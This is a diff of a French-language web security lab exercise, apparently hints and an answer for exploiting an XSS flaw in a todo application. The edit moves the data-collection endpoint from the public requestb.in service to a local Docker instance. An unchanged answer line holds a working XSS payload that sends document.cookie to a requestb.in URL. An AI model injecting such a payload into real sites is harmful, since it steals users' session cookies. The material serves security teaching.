@@ -276,7 +276,7 @@ Le site est sensible aux attaques XSS. Profitez en pour obtenir les informations
 
 [id=astuce16,role=collapse]
 --
-Utilisez le site https://requestb.in/ pour recueillir les informations de l'attaque XSS
+Utilisez votre instance docker de  //requestb.in/ pour recueillir les informations de l'attaque XSS
 --
 
 [id=astuce17,role=collapse]
@@ -287,7 +287,7 @@ Créez un todo de type publique avec un script d'attaque
 
 [id=reponse9,role=collapse]
 --
-utilisez le code suivant dans la description de la todo (en remplaçant l'id 1lwyhpu1 par celui que vous avez généré).
+utilisez le code suivant dans la description de la todo (en remplaçant l'url par votre instance requestb.in).
 <script>document.write("<img src=https://requestb.in/1lwyhpu1?s="+encodeURI(document.cookie)+"></img>");</script>
 --
 
